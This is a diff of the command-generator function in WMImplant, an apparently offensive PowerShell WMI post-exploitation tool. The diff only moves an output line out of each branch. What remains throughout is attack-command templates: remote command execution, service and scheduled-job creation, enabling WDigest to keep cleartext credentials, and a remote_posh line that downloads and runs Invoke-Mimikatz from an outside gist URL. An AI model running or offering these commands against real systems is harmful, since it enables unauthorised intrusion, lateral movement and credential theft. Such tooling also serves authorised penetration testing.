@@ -726,14 +726,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "ls"
@@ -743,14 +742,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command ls -RemoteFile $DirLs -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command ls -RemoteFile $DirLs -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "ninjacopy"
@@ -765,14 +763,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command ninjacopy -RemoteFile $FileToCopy -LocalFile $CopyLocation -RemoteUser $GenUserName -RemotePass $GenPassword -Target $GenTarget`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command ninjacopy -RemoteFile $FileToCopy -LocalFile $CopyLocation -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "search"
@@ -790,13 +787,11 @@ function Invoke-CommandGeneration
                 if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                 {
                     $Command = "`nInvoke-WMImplant -command search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                    $Command
                 }
 
                 else
                 {
                     $Command = "`nInvoke-WMImplant -command search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget`n"
-                    $Command
                 }
             }
             else
@@ -807,15 +802,14 @@ function Invoke-CommandGeneration
                 if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                 {
                     $Command = "`nInvoke-WMImplant -command search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                    $Command
                 }
 
                 else
                 {
                     $Command = "`nInvoke-WMImplant -command search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget`n"
-                    $Command
                 }
             }
+            $Command
         }
 
         "upload"
@@ -830,14 +824,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "command_exec"
@@ -846,13 +839,12 @@ function Invoke-CommandGeneration
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
             else
             {
                 $Command = "`nInvoke-WMImplant -command command_exec -RemoteCommand $GenCommandExec -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "disable_wdigest"
@@ -860,13 +852,12 @@ function Invoke-CommandGeneration
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
             else
             {
                 $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "disable_winrm"
@@ -874,13 +865,12 @@ function Invoke-CommandGeneration
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command disable_winrm -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
             else
             {
                 $Command = "`nInvoke-WMImplant -command disable_winrm -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "enable_wdigest"
@@ -888,13 +878,12 @@ function Invoke-CommandGeneration
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
             else
             {
                 $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegValue 'UseLogonCredential' -RegData '1' -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "enable_winrm"
@@ -902,13 +891,12 @@ function Invoke-CommandGeneration
             if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command enable_winrm -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
             else
             {
                 $Command = "`nInvoke-WMImplant -command enable_winrm -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "registry_mod"
@@ -927,12 +915,10 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -RegData $GenRegData -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod create -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -RegData $GenRegData -Target $GenTarget`n"
-                        $Command
                     }
                 }
 
@@ -941,14 +927,13 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command registry_mod -RegMethod delete -RegHive $GenRegHive -RegKey $GenRegKey -RegValue $GenRegValue -Target $GenTarget`n"
-                        $Command
                     }
                 }
+                $Command
             }
 
         }
@@ -961,14 +946,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command remote_posh -Url $PoshURL -Function $PoshFunction -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command remote_posh -Url $PoshURL -Function $PoshFunction -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "sched_job"
@@ -983,12 +967,10 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command sched_job -JobAction list -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command sched_job -JobAction list -Target $GenTarget`n"
-                        $Command
                     }
                 }
 
@@ -998,12 +980,10 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command sched_job -JobAction delete -RemoteID $GenJobID -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command sched_job -JobAction delete -RemoteID $GenJobID -Target $GenTarget`n"
-                        $Command
                     }
                 }
 
@@ -1014,14 +994,13 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command sched_job -JobAction create -RemoteFile $GenJobName -Time $GenJobTime -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command sched_job -JobAction create -RemoteFile $GenJobName -Time $GenJobTime -Target $GenTarget`n"
-                        $Command
                     }
                 }
+                $Command
             }
         }
 
@@ -1038,12 +1017,10 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction start -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction start -ServiceName $GenServiceName -Target $GenTarget`n"
-                        $Command
                     }
                 }
 
@@ -1052,12 +1029,10 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction stop -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction stop -ServiceName $GenServiceName -Target $GenTarget`n"
-                        $Command
                     }
                 }
 
@@ -1066,12 +1041,10 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction delete -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction delete -ServiceName $GenServiceName -Target $GenTarget`n"
-                        $Command
                     }
                 }
 
@@ -1081,14 +1054,13 @@ function Invoke-CommandGeneration
                     if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction create -ServiceName $GenServiceName -RemoteFile $GenServicePath -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command service_mod -ServiceAction create -ServiceName $GenServiceName -RemoteFile $GenServicePath -Target $GenTarget`n"
-                        $Command
                     }
                 }
+                $Command
             }
         }
 
@@ -1097,14 +1069,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command remote_posh -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command remote_posh -Url https://gist.githubusercontent.com/ChrisTruncer/5cf37e859372f135219daa4b699eb587/raw/f6517e07463427c8f9e418e8ca5dd4afbcaf9654/gistfile1.txt -Function Invoke-Mimikatz -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "process_kill"
@@ -1120,13 +1091,11 @@ function Invoke-CommandGeneration
                     if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command process_kill -ProcessName $GenProcName -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                        $Command
                     }
 
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command process_kill -ProcessName $GenProcName -Target $GenTarget`n"
-                        $Command
                     }
                 }
 
@@ -1136,15 +1105,14 @@ function Invoke-CommandGeneration
                     if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command process_kill -ProcessID $GenProcID -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                        $Command
                     }
 
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command process_kill -ProcessID $GenProcID -Target $GenTarget -Target $GenTarget`n"
-                        $Command
                     }
                 }
+                $Command
             }
         }
 
@@ -1154,14 +1122,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command process_start -RemoteFile $GenProcPath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command process_start -RemoteFile $GenProcPath -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "ps"
@@ -1169,14 +1136,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command ps -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command ps -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "active_users"
@@ -1184,14 +1150,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command active_users -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command active_users -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "basic_info"
@@ -1199,14 +1164,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command basic_info -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command basic_info -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "drive_list"
@@ -1214,14 +1178,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command drive_list -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command drive_list -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "ifconfig"
@@ -1229,14 +1192,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command ifconfig -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command ifconfig -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "installed_programs"
@@ -1244,14 +1206,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command installed_programs -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command installed_programs -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "logon_events"
@@ -1269,31 +1230,27 @@ function Invoke-CommandGeneration
                     if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword -LocalFile $GenFileSave`n"
-                        $Command
                     }
 
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget -LocalFile $GenFileSave`n"
-                        $Command
                     }
                 }
 
                 default
                 {
-                    Write-Host "In here"
                     if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
                     {
                         $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                        $Command
                     }
 
                     else
                     {
                         $Command = "`nInvoke-WMImplant -command logon_events -Target $GenTarget`n"
-                        $Command
                     }
                 }
+                $Command
             }
         }
 
@@ -1302,14 +1259,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command logoff -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command logoff -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "reboot"
@@ -1317,14 +1273,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command reboot -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command reboot -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "power_off"
@@ -1332,14 +1287,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command power_off -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command power_off -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "vacant_system"
@@ -1347,14 +1301,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command vacant_system -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command vacant_system -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         default
